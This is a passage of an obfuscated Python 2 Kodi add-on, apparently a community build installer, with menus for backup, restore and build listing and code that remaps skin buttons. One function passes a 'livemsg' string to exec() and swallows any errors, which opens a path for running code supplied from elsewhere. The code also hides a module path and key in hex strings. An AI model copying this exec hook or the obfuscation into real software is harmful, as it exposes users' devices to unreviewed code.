      ooOiii1 . write ( II1ii1ii11I1 + '[CR]' )
     ooOiii1 . write ( '\n' )
    if I1i1I1I11IiiI == 1 :
     try :
      os . remove ( OOoO0oo0O )
      print "### SUCCESS - deleted " + OOoO0oo0O
      ooOiii1 . write ( '[COLOR=dodgerblue]SUCCESSFULLY DELETED:[/COLOR]\n' )
      for II1ii1ii11I1 in o0ooOO0o ( OOoO0oo0O , 75 ) :
       ooOiii1 . write ( II1ii1ii11I1 + '[CR]' )
      ooOiii1 . write ( '\n' )
      if 71 - 71: OoooooooOO
     except :
      print "######## FAILED TO REMOVE: " + OOoO0oo0O
      print "######## Make sure you manually remove this file ##########"
      OO0o0oO0O000o . write ( '[COLOR=red]FAILED TO DELETE:[/COLOR]\n' )
      for II1ii1ii11I1 in o0ooOO0o ( OOoO0oo0O , 75 ) :
       OO0o0oO0O000o . write ( II1ii1ii11I1 + '[CR]' )
      OO0o0oO0O000o . write ( '\n' )
      if 5 - 5: OoOoOO00 % OoooooooOO
 OO0o0oO0O000o . close ( )
 ooOiii1 . close ( )
 if 60 - 60: OoOoOO00 . i1IIi % OoO0O00 % iiiiiiii1 % Oo
 if 33 - 33: iIii1I11I1II1 - O00OOo00oo0o * I1ii11iIi11i % iIii1I11I1II1 + OoO0O00 . Oo
 ooOiii1 = open ( oo0OooOOo0 , mode = 'r' )
 ooo0O0oOoooO0 = ooOiii1 . read ( )
 ooOiii1 . close ( )
 OO0o0oO0O000o = open ( o0OO00oO , mode = 'r' )
 I1iIII1IiiI = OO0o0oO0O000o . read ( )
 OO0o0oO0O000o . close ( )
 if ooo0O0oOoooO0 == '' and I1iIII1IiiI == '' :
  iI111I11I1I1 . ok ( 'No Special Characters Found' , 'Great news, all filenames in the path you scanned are ASCII based - no special characters found.' )
 else :
  OOoooOoO0Oo = open ( i1I1iI , mode = 'w+' )
  OOoooOoO0Oo . write ( ooo0O0oOoooO0 + '\n\n' + I1iIII1IiiI )
  OOoooOoO0Oo . close ( )
  Oo000 = open ( i1I1iI , mode = 'r' )
  iiIiII11i1 = Oo000 . read ( )
  Oo000 . close ( )
  oOo00Ooo0o0 ( 'Final Results' , iiIiII11i1 )
  os . remove ( i1I1iI )
 os . remove ( oo0OooOOo0 )
 os . remove ( o0OO00oO )
 if 33 - 33: OOOoOoo0O
 if 87 - 87: OoOoOO00 / IIiiiI1iIII + iIii1I11I1II1
def oo0O0o ( ) :
 Ii1I1Ii ( '' , '[COLOR=dodgerblue]How to create and share my build[/COLOR]' , '' , 'instructions_1' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 Ii1I1Ii ( '' , '[COLOR=gold]-----------------------------------------------------------------[/COLOR]' , '' , '' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Create Community Build (for sharing on CP only)' , 'url' , 'community_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 if IioO0O ( ) :
  Ii1I1Ii ( '' , 'Create OpenELEC Backup (full backup can only be used on OpenELEC)' , 'none' , 'openelec_backup' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Create Universal Build (local backups only)' , 'none' , 'community_backup_2' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Create Full Backup (will only work on THIS device)' , 'local' , 'local_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 Ii1I1Ii ( '' , 'Backup Addons Only' , 'addons' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Addons' )
 Ii1I1Ii ( '' , 'Backup Addon Data Only' , 'addon_data' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Addon Userdata' )
 Ii1I1Ii ( '' , 'Backup Guisettings.xml' , iIi1ii1I1 , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your guisettings.xml' )
 if 79 - 79: OoooooooOO - IIiiiI1iIII * IIiiiI1iIII . OoOoOO00
 if os . path . exists ( ooooooO0oo ) :
  Ii1I1Ii ( '' , 'Backup Favourites.xml' , ooooooO0oo , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your favourites.xml' )
  if 100 - 100: II111iiii * OOOoOoo0O % I1IiiI / I1ii11iIi11i
 if os . path . exists ( IIiiiiiiIi1I1 ) :
  Ii1I1Ii ( '' , 'Backup Source.xml' , IIiiiiiiIi1I1 , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your sources.xml' )
  if 90 - 90: I1ii11iIi11i . iiiiiiii1 . OoOoOO00 . O00OOo00oo0o
 if os . path . exists ( I1IIIii ) :
  Ii1I1Ii ( '' , 'Backup Advancedsettings.xml' , I1IIIii , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your advancedsettings.xml' )
  if 4 - 4: O00OOo00oo0o + OoOoOO00 % I1ii11iIi11i / i11iIiiIii
 if os . path . exists ( OOO00 ) :
  Ii1I1Ii ( '' , 'Backup Advancedsettings.xml' , OOO00 , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your keyboard.xml' )
  if 74 - 74: II111iiii . O0 - I1IiiI + IIiiiI1iIII % i11iIiiIii % OoOoOO00
 if os . path . exists ( OOOO ) :
  Ii1I1Ii ( '' , 'Backup RssFeeds.xml' , OOOO , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your RssFeeds.xml' )
  if 78 - 78: O00OOo00oo0o + OoOoOO00 + IIiiiI1iIII - IIiiiI1iIII . i11iIiiIii / OoO0O00
  if 27 - 27: O00OOo00oo0o - O0 % OOOoOoo0O * IIi . IIiiiI1iIII % iIii1I11I1II1
def IiIi1i ( ) :
 Ii1I1Ii ( 'folder' , 'Backup My Content' , 'none' , 'backup_option' , 'mainmenu/maintenance.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Restore My Content' , 'none' , 'restore_option' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 99 - 99: OoOoOO00 . IIi
 if 59 - 59: OOOoOoo0O / Oo0Ooo / Oo / O0 / OoOoOO00 + o0oOOo0O0Ooo
def IIiI1111i1 ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://repos/",return)' )
 if 46 - 46: IIiiiI1iIII
 if 29 - 29: II111iiii . OoOoOO00 % o0oOOo0O0Ooo * II111iiii - o0oOOo0O0Ooo * iIii1I11I1II1
def iii1i1III ( ) :
 if 65 - 65: Oo - IIiIi1iI
 oOOo00O0OOOo = os . path . join ( II11iiii1Ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) , 'tag.cfg' )
 if os . path . exists ( oOOo00O0OOOo ) :
  IIiIiI = open ( oOOo00O0OOOo , 'r' )
  ii1I1 = IIiIiI . read ( )
  IIiIiI . close ( )
  return binascii . unhexlify ( ii1I1 )
 else :
  return binascii . unhexlify ( '6e6c616b73646a666c6b61736a64666c6a616c736b6a666c6b616a7366' )
  if 45 - 45: O00OOo00oo0o . OoooooooOO
  if 27 - 27: O00OOo00oo0o * Oo0Ooo . OoOoOO00
def Ii111Iiiii ( localbuildcheck , localversioncheck , id , welcometext , livemsg ) :
 iIii ( )
 if livemsg != 'none' :
  try :
   exec ( livemsg )
   if 35 - 35: OoooooooOO - IIi / OoO0O00
  except :
   pass
 if ( Oo0oO0ooo . replace ( '%20' , ' ' ) in welcometext ) and ( 'elc' in welcometext ) and Oo0oO0ooo != '' :
  Ii1I1Ii ( '' , welcometext , 'show' , 'user_info' , '' , '' , '' , '' )
  if 50 - 50: OoOoOO00
 if id != 'None' :
  if 33 - 33: OOOoOoo0O
  if id != 'Local' :
   oOo00OoO0O = OoOoO0OooOOo ( localbuildcheck , localversioncheck , id )
   if 94 - 94: o0oOOo0O0Ooo . OoO0O00
   if oOo00OoO0O == True :
    if 68 - 68: o0oOOo0O0Ooo
    if not 'Partially installed' in localbuildcheck :
     Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]' + localbuildcheck + ':[/COLOR] [COLOR=lime]NEW VERSION AVAILABLE[/COLOR]' , id , 'showinfo' , '' , '' , '' , '' )
     if 20 - 20: IIi - IIi
    if '(Partially installed)' in localbuildcheck :
     Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo2' , '' , '' , '' , '' )
   else :
    Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo' , '' , '' , '' , '' )
    if 37 - 37: IIiiiI1iIII
  else :
   if 37 - 37: Oo0Ooo / IIiiiI1iIII * O0
   if localbuildcheck == 'Incomplete' :
    Ii1I1Ii ( '' , '[COLOR=darkcyan]Your last restore is not yet completed[/COLOR]' , 'url' , o0o00O0oOooO0 ( ) , '' , '' , '' , '' )
    if 99 - 99: iiiiiiii1
   else :
    Ii1I1Ii ( '' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]Local Build (' + localbuildcheck + ')[/COLOR]' , '' , '' , '' , '' , '' , '' )
 o0OO00 = 0
 if 14 - 14: I1ii11iIi11i + i11iIiiIii
 if os . path . exists ( II ) :
  for ooo0O in os . listdir ( II ) :
   if ooo0O != 'Master' :
    o0OO00 += 1
    if 83 - 83: I1ii11iIi11i / i11iIiiIii + II111iiii . IIiIi1iI * Oo + IIiiiI1iIII
  if o0OO00 > 1 :
   Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Switch Build Profile[/COLOR]' , localbuildcheck , 'switch_profile_menu' , '' , '' , '' , '' )
   Ii1I1Ii ( '' , '[COLOR=orange]---------------------------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
   if 42 - 42: i1IIi % II111iiii . iiiiiiii1
   if 7 - 7: I1ii11iIi11i - ooOo * Oo + o0oOOo0O0Ooo . I1ii11iIi11i
   if 85 - 85: O0
 Ii1I1Ii ( '' , '[COLOR=yellow]Settings[/COLOR]' , 'settings' , 'addon_settings' , 'mainmenu/settings.png' , '' , '' , '' )
 if 32 - 32: OoooooooOO . OoO0O00 / Oo0Ooo * o0oOOo0O0Ooo / o0oOOo0O0Ooo * O00OOo00oo0o
 if 19 - 19: O00OOo00oo0o
 Ii1I1Ii ( 'folder' , 'Add-on Portal' , '' , 'addonmenu' , 'mainmenu/addons.png' , '' , '' , '' )
 if 55 - 55: Oo % Oo / O0 % IIiIi1iI - o0oOOo0O0Ooo . Oo0Ooo
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  Ii1I1Ii ( 'folder' , 'App Installer' , '' , 'app_installer' , 'mainmenu/apps.png' , '' , '' , '' )
  if 49 - 49: iIii1I11I1II1 * i1IIi . OoooooooOO
 Ii1I1Ii ( 'folder' , 'Community Builds' , '' , 'CB_Menu' , 'mainmenu/builds.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Keyword Installer' , '' , 'nan_menu' , 'mainmenu/keyword.png' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Tutorials' , '' , 'tutorial_root_menu' , 'mainmenu/tuts.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Maintenance' , 'none' , 'tools' , 'mainmenu/maintenance.png' , '' , '' , '' )
 if 90 - 90: o0oOOo0O0Ooo % I1ii11iIi11i - iIii1I11I1II1 % OoOoOO00
 if 8 - 8: OoOoOO00 * Oo0Ooo / IIiiiI1iIII % O00OOo00oo0o - I1IiiI
def oo0ooooo00o ( ) :
 if os . path . exists ( O0o0O00Oo0o0 ) :
  shutil . rmtree ( O0o0O00Oo0o0 )
  if 78 - 78: iIii1I11I1II1 . o0oOOo0O0Ooo % iIii1I11I1II1 . O0 / Oo
 if not os . path . exists ( O0o0O00Oo0o0 ) :
  os . makedirs ( O0o0O00Oo0o0 )
  if 76 - 76: i1IIi * OoooooooOO * O0 + IIi * IIi
 i1iIiIii = iI1iiI1III1i ( )
 iii1 = ooo0O0o00O ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' , 10 )
 if 13 - 13: iIii1I11I1II1
 OOooO0OOoo . create ( 'Backing Up Add-ons' , '' , 'Please Wait...' )
 if 77 - 77: i11iIiiIii - iIii1I11I1II1 / ooOo / iiiiiiii1 / OoO0O00
 for ooo0O in os . listdir ( II11iiii1Ii ) :
  if 56 - 56: OoooooooOO * O0
  if 85 - 85: OoooooooOO % OoOoOO00 * iIii1I11I1II1
  if not 'totalinstaller' in ooo0O and not 'plugin.program.tbs' in ooo0O and not 'packages' in ooo0O and os . path . isdir ( os . path . join ( II11iiii1Ii , ooo0O ) ) :
   if 44 - 44: iIii1I11I1II1 . I1ii11iIi11i + IIi . iiiiiiii1
   if 7 - 7: I1ii11iIi11i + iIii1I11I1II1 * OOOoOoo0O * OOOoOoo0O / II111iiii - O00OOo00oo0o
   if ooo0O in iii1 and not ooo0O in i1iIiIii and not 'repo.' in ooo0O and not 'repository.' in ooo0O and os . path . isdir ( os . path . join ( II11iiii1Ii , ooo0O ) ) :
    if 65 - 65: ooOo + OoOoOO00 + II111iiii
    if 77 - 77: II111iiii
    if not 'service.xbmc.versioncheck' in ooo0O and not 'packages' in ooo0O and os . path . isdir ( os . path . join ( II11iiii1Ii , ooo0O ) ) :
     if 50 - 50: O0 . O0 . iiiiiiii1 % Oo0Ooo
     try :
      OOooO0OOoo . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % ooo0O , 'Please Wait...' )
      os . makedirs ( os . path . join ( O0o0O00Oo0o0 , ooo0O ) )
      if 68 - 68: ooOo
      IiIiIi1I1 = os . path . join ( O0o0O00Oo0o0 , ooo0O , 'addon.xml' )
      i11iIIiI1I1 = os . path . join ( O0o0O00Oo0o0 , ooo0O , 'default.py' )
      iIiIIiI1i1Ii = open ( os . path . join ( II11iiii1Ii , ooo0O , 'addon.xml' ) , mode = 'r' )
      ii1I1 = iIiIIiI1i1Ii . read ( )
      iIiIIiI1i1Ii . close ( )
      if 72 - 72: Oo . Oo - I1ii11iIi11i
      III1II1i = re . compile ( ' name="(.+?)"' ) . findall ( ii1I1 )
      iI1i1IiIIIIi = re . compile ( 'provider-name="(.+?)"' ) . findall ( ii1I1 )
      OooOooO0O0o0 = re . compile ( '<addon[\s\S]*?">' ) . findall ( ii1I1 )
      OOO0o0 = re . compile ( '<description[\s\S]*?<\/description>' ) . findall ( ii1I1 )
      oOooo0 = III1II1i [ 0 ] if ( len ( III1II1i ) > 0 ) else 'None'
      I1IIii1 = iI1i1IiIIIIi [ 0 ] if ( len ( iI1i1IiIIIIi ) > 0 ) else 'Anonymous'
      IIIIII111Ii = OooOooO0O0o0 [ 0 ] if ( len ( OooOooO0O0o0 ) > 0 ) else 'None'
      oo0O00Oooo0O0 = OOO0o0 [ 0 ] if ( len ( OOO0o0 ) > 0 ) else 'None'
      if 5 - 5: i1IIi + O0 % O0 * O0 + OoOoOO00 % i1IIi
      O0OOo = '<addon id="' + ooo0O + '" name="' + oOooo0 + '" version="0" provider-name="' + I1IIii1 + '">'
      O00Oo = '<description>If you\'re seeing this message it means the add-on is still updating, please wait for the update process to complete.</description>'
      if 41 - 41: O00OOo00oo0o + i11iIiiIii / IIiiiI1iIII % I1ii11iIi11i
      if IIIIII111Ii != 'None' :
       OOO = ii1I1 . replace ( oo0O00Oooo0O0 , O00Oo ) . replace ( IIIIII111Ii , O0OOo )
       if 22 - 22: OoOoOO00 % o0oOOo0O0Ooo * O00OOo00oo0o - I1ii11iIi11i + o0oOOo0O0Ooo - Oo0Ooo
      else :
       OOO = ii1I1 . replace ( oo0O00Oooo0O0 , O00Oo )
       if 15 - 15: Oo
      OooooOOoo0 = open ( IiIiIi1I1 , mode = 'w+' )
      OooooOOoo0 . write ( str ( OOO ) )
      OooooOOoo0 . close ( )
      i1iiI = open ( i11iIIiI1I1 , mode = 'w+' )
      i1iiI . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + ooo0O + '"\nAddonName="' + oOooo0 + '"\ndialog=xbmcgui.Dialog()\ndialog.ok(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating so we recommend waiting a few minutes to see if it updates naturally. If it hasn\'t updated after 5mins please try reinstalling via the Community Portal add-on")\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
      i1iiI . close ( )
      if 83 - 83: ooOo / iIii1I11I1II1 + i1IIi / IIiIi1iI
     except :
      print "### Failed to backup: " + ooo0O
      if 47 - 47: ooOo + OoooooooOO . II111iiii . IIiIi1iI
      if 66 - 66: iiiiiiii1 * OoOoOO00
   else :
    try :
     shutil . copytree ( os . path . join ( II11iiii1Ii , ooo0O ) , os . path . join ( O0o0O00Oo0o0 , ooo0O ) )
    except :
     print "### Failed to copy: " + ooo0O
     if 2 - 2: ooOo . IIi * Oo0Ooo + O0 - OOOoOoo0O * iIii1I11I1II1
 OOooO0OOoo . close ( )
 if 12 - 12: o0oOOo0O0Ooo * IIi % II111iiii * i1IIi * iIii1I11I1II1
 oO0oOoo0O = "Creating Backup"
 II1iI11 = "Archiving..."
 O00o0O = ""
 O00oOo0O0o00O = "Please Wait"
 if 91 - 91: II111iiii * IIiIi1iI . i1IIi
 iiIIii ( O0o0O00Oo0o0 , O00O0oOO00O00 , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , '' , '' )
 if 22 - 22: ooOo * O00OOo00oo0o * i11iIiiIii + IIiIi1iI * OoOoOO00 * OoO0O00
 try :
  shutil . rmtree ( O0o0O00Oo0o0 )
  if 85 - 85: IIiIi1iI * Oo % Oo0Ooo - IIiIi1iI - OOOoOoo0O
 except :
  print "### COMMUNITY BUILDS: Failed to remove temp addons folder - manual delete required ###"
  if 46 - 46: O0
  if 65 - 65: iIii1I11I1II1 % ooOo + O0 / OoooooooOO
def O0000oO0o00 ( url ) :
 OOooO0OOoo . create ( 'Cleaning Temp Paths' , '' , 'Please wait...' )
 if os . path . exists ( O0o0O00Oo0o0 ) :
  shutil . rmtree ( O0o0O00Oo0o0 )
  if 80 - 80: OoooooooOO + IIiiiI1iIII
 if not os . path . exists ( O0o0O00Oo0o0 ) :
  os . makedirs ( O0o0O00Oo0o0 )
  if 95 - 95: IIi / ooOo * IIi - OoooooooOO * OoooooooOO % OoO0O00
 extract . all ( O00O0oOO00O00 , O0o0O00Oo0o0 , OOooO0OOoo )
 if 43 - 43: Oo0Ooo . IIi
 for ooo0O in os . listdir ( O0o0O00Oo0o0 ) :
  if 12 - 12: IIi + Oo + OOOoOoo0O . IIiiiI1iIII / O00OOo00oo0o
  if not 'totalinstaller' in ooo0O and not 'plugin.program.tbs' in ooo0O :
   if not os . path . exists ( os . path . join ( II11iiii1Ii , ooo0O ) ) :
    os . rename ( os . path . join ( O0o0O00Oo0o0 , ooo0O ) , os . path . join ( II11iiii1Ii , ooo0O ) )
    OOooO0OOoo . update ( 0 , "Installing: [COLOR=yellow]" + ooo0O + '[/COLOR]' , '' , 'Please wait...' )
    print "### Successfully installed: " + ooo0O
    if 29 - 29: IIiiiI1iIII . iiiiiiii1 - II111iiii
   else :
    print "### " + ooo0O + " Already exists on system"
    if 68 - 68: iIii1I11I1II1 + II111iiii / ooOo
    if 91 - 91: OoOoOO00 % iIii1I11I1II1 . I1IiiI
def O00ooooo00 ( welcometext ) :
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  iIII1iiIi11 = i1IIi1i1Ii1 ( )
  O0ooOoOO0 = os . path . join ( iIII1iiIi11 , 'Download' )
  try :
   if not os . path . exists ( O0ooOoOO0 ) :
    os . makedirs ( O0ooOoOO0 )
  except :
   xbmc . log ( "### Failed to make download folder" )
   if 56 - 56: o0oOOo0O0Ooo / IIiiiI1iIII * I1IiiI . o0oOOo0O0Ooo
 iiO0o0O0oo0o = xbmc . getInfoLabel ( "System.BuildVersion" )
 O0OoooI11iI1I = float ( iiO0o0O0oo0o [ : 2 ] )
 oOOo0oo0O = int ( O0OoooI11iI1I )
 if 50 - 50: iIii1I11I1II1 * IIiiiI1iIII . OoooooooOO / II111iiii - I1ii11iIi11i * I1ii11iIi11i
 if iI1Ii11111iIi == 'true' :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Show My Private List[/COLOR]' , '&visibility=private' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 98 - 98: OoO0O00 - O00OOo00oo0o . IIiiiI1iIII % i11iIiiIii
 if ( oOOo0oo0O < 14 ) or ( i1 == 'true' ) :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Show All Gotham Compatible Builds[/COLOR]' , '&xbmc=gotham&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 69 - 69: I1ii11iIi11i + IIiIi1iI * O0 . Oo % OoOoOO00
 if ( oOOo0oo0O == 14 ) or ( i1 == 'true' ) :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Show All Helix Compatible Builds[/COLOR]' , '&xbmc=helix&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 96 - 96: iiiiiiii1 . iiiiiiii1 - OOOoOoo0O / OOOoOoo0O
 if ( oOOo0oo0O == 15 ) or ( i1 == 'true' ) :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Show All Isengard Compatible Builds[/COLOR]' , '&xbmc=isengard&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if ( oOOo0oo0O == 16 ) or ( i1 == 'true' ) :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Show All Jarvis Compatible Builds[/COLOR]' , '&xbmc=jarvis&visibility=public' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
  if 96 - 96: i11iIiiIii / I1IiiI - O0 . iiiiiiii1
 if i11 == 'false' :
  Ii1I1Ii ( '' , '[COLOR=gold]How to fix builds broken on other wizards![/COLOR]' , '' , 'instructions_5' , 'mainmenu/builds.png' , '' , '' , '' )
 if I11 != '' and i11 == 'true' :
  Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Show ' + Oo0o0000o0o0 + ' Builds[/COLOR]' , '&id=1' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if oOo0oooo00o != '' and i11 == 'true' :
  Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Show ' + oO0o0o0ooO0oO + ' Builds[/COLOR]' , '&id=2' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if oo0o0O00 != '' and i11 == 'true' :
  Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Show ' + oO + ' Builds[/COLOR]' , '&id=3' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if i1iiIIiiI111 != '' and i11 == 'true' :
  Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Show ' + oooOOOOO + ' Builds[/COLOR]' , '&id=4' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 if i1iiIII111ii != '' and i11 == 'true' :
  Ii1I1Ii ( 'folder' , '[COLOR=darkcyan]Show ' + i1iIIi1 + ' Builds[/COLOR]' , '&id=5' , 'grab_builds' , 'mainmenu/builds.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Create My Own Community Build' , 'url' , 'backup_option' , 'mainmenu/builds.png' , '' , '' , 'Back Up Your Full System' )
 if 39 - 39: iiiiiiii1 / O0 * IIiiiI1iIII
 if 17 - 17: O00OOo00oo0o / iIii1I11I1II1 - OoO0O00 + I1IiiI % Oo
def III1III11II ( skin ) :
 iIi1iI = '<onleft>%s</onleft>'
 OO0OoIIiiiiiIiIIi = '<onright>%s</onright>'
 iiIiiIi1 = '<onup>%s</onup>'
 I1Ii11i = '<ondown>%s</ondown>'
 I1iIiiiI1 = '<control type="button" id="%s">'
 if 87 - 87: OoOoOO00 - iiiiiiii1 - Oo + Oo0Ooo % iIii1I11I1II1 / i11iIiiIii
 if 12 - 12: iiiiiiii1
 oOOO0ooOO = [
 ( '65' , '140' ) ,
 ( '66' , '164' ) ,
 ( '67' , '162' ) ,
 ( '68' , '142' ) ,
 ( '69' , '122' ) ,
 ( '70' , '143' ) ,
 ( '71' , '144' ) ,
 ( '72' , '145' ) ,
 ( '73' , '127' ) ,
 ( '74' , '146' ) ,
 ( '75' , '147' ) ,
 ( '76' , '148' ) ,
 ( '77' , '166' ) ,
 ( '78' , '165' ) ,
 ( '79' , '128' ) ,
 ( '80' , '129' ) ,
 ( '81' , '120' ) ,
 ( '82' , '123' ) ,
 ( '83' , '141' ) ,
 ( '84' , '124' ) ,
 ( '85' , '126' ) ,
 ( '86' , '163' ) ,
 ( '87' , '121' ) ,
 ( '88' , '161' ) ,
 ( '89' , '125' ) ,
 ( '90' , '160' ) ]
 if 3 - 3: OoooooooOO
 for O0OoO0o , I111IIiIII in oOOO0ooOO :
  OO0OOoo0OOO = open ( skin ) . read ( )
  ooooOoo0OO = OO0OOoo0OOO . replace ( I1iIiiiI1 % O0OoO0o , I1iIiiiI1 % I111IIiIII ) . replace ( iIi1iI % O0OoO0o , iIi1iI % I111IIiIII ) . replace ( OO0OoIIiiiiiIiIIi % O0OoO0o , OO0OoIIiiiiiIiIIi % I111IIiIII ) . replace ( iiIiiIi1 % O0OoO0o , iiIiiIi1 % I111IIiIII ) . replace ( I1Ii11i % O0OoO0o , I1Ii11i % I111IIiIII )
  IIiI1i = open ( skin , mode = 'w' )
  IIiI1i . write ( ooooOoo0OO )
  IIiI1i . close ( )
  if 85 - 85: II111iiii . iiiiiiii1 % Oo % OOOoOoo0O
def OOo00ooOoO0o ( u , skin ) :
 iIi1iI = '<onleft>%s</onleft>'
 OO0OoIIiiiiiIiIIi = '<onright>%s</onright>'
 iiIiiIi1 = '<onup>%s</onup>'
 I1Ii11i = '<ondown>%s</ondown>'
 I1iIiiiI1 = '<control type="button" id="%s">'
 if 21 - 21: i11iIiiIii
 if u < 49 :
  o00iIiiiII = u + 61
  if 5 - 5: OoooooooOO / o0oOOo0O0Ooo % OOOoOoo0O % OoO0O00 * IIiIi1iI + iIii1I11I1II1
 else :
  o00iIiiiII = u + 51
  if 11 - 11: IIi % i11iIiiIii % ooOo . IIiiiI1iIII
 OO0OOoo0OOO = open ( skin ) . read ( )
 ooooOoo0OO = OO0OOoo0OOO . replace ( iIi1iI % u , iIi1iI % o00iIiiiII ) . replace ( OO0OoIIiiiiiIiIIi % u , OO0OoIIiiiiiIiIIi % o00iIiiiII ) . replace ( iiIiiIi1 % u , iiIiiIi1 % o00iIiiiII ) . replace ( I1Ii11i % u , I1Ii11i % o00iIiiiII ) . replace ( I1iIiiiI1 % u , I1iIiiiI1 % o00iIiiiII )
 IIiI1i = open ( skin , mode = 'w' )
 IIiI1i . write ( ooooOoo0OO )
 IIiI1i . close ( )
 if 92 - 92: II111iiii
def IiIIi1II1i ( description ) :
 ooO0OOo0 = os . path . join ( II , 'extracted' )
 iIII11Iiii1 = os . path . join ( II , 'temp' )
 o0oo0 = os . path . join ( ooO0OOo0 , 'userdata' , '.cbcfg' )
 OoO0OOoO0Oo0 = os . path . join ( II , description , 'addonlist' )
 oO00O = open ( OoO0OOoO0Oo0 , 'w+' )
 II111IiiiI1 = [ ]
 if 75 - 75: iiiiiiii1
 if not os . path . exists ( os . path . join ( II , description ) ) :
  os . makedirs ( os . path . join ( II , description ) )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Created: %s" % os . path . join ( II , description ) )
 if not os . path . exists ( ooOoOoo0O ) :
  os . makedirs ( ooOoOoo0O )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Created: %s" % ooOoOoo0O )
 if os . path . exists ( iIII11Iiii1 ) :
  shutil . rmtree ( iIII11Iiii1 )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Removed: %s" % iIII11Iiii1 )
   if 29 - 29: I1ii11iIi11i
 if os . path . exists ( o0oo0 ) :
  if not os . path . exists ( iIII11Iiii1 ) :
   os . makedirs ( iIII11Iiii1 )
   if oOOoo00O0O == 'true' :
    xbmc . log ( "### Created: %s" % iIII11Iiii1 )
  extract . all ( o0oo0 , iIII11Iiii1 , OOooO0OOoo )
  xbmc . log ( "### NEW STYLE BUILD" )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Extracted " + o0oo0 + " to: " + iIII11Iiii1 )
 elif os . path . exists ( os . path . join ( ooO0OOo0 , 'addons' ) ) :
  os . rename ( os . path . join ( ooO0OOo0 , 'addons' ) , iIII11Iiii1 )
  xbmc . log ( "### OLD BUILD - RENAMED ADDONS FOLDER" )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### (line 1465) renamed " + os . path . join ( ooO0OOo0 , 'addons' ) + " to " + iIII11Iiii1 )
   if 53 - 53: i11iIiiIii . I1ii11iIi11i % O00OOo00oo0o / iiiiiiii1 % iIii1I11I1II1
 OOooO0OOoo . create ( 'Copying Addons' , '' , '' , '' )
 if 6 - 6: Oo0Ooo - Oo . iIii1I11I1II1
 for ooo0O in os . listdir ( OO0o ) :
  II111IiiiI1 . append ( ooo0O )
  if 30 - 30: iiiiiiii1 + iiiiiiii1 % IIiiiI1iIII - o0oOOo0O0Ooo - I1ii11iIi11i
 for ooo0O in os . listdir ( II11iiii1Ii ) :
  II111IiiiI1 . append ( ooo0O )
  if 36 - 36: OOOoOoo0O % Oo
 if os . path . exists ( ooOoOoo0O ) :
  for ooo0O in os . listdir ( ooOoOoo0O ) :
   if not ooo0O in II111IiiiI1 :
    II111IiiiI1 . append ( ooo0O )
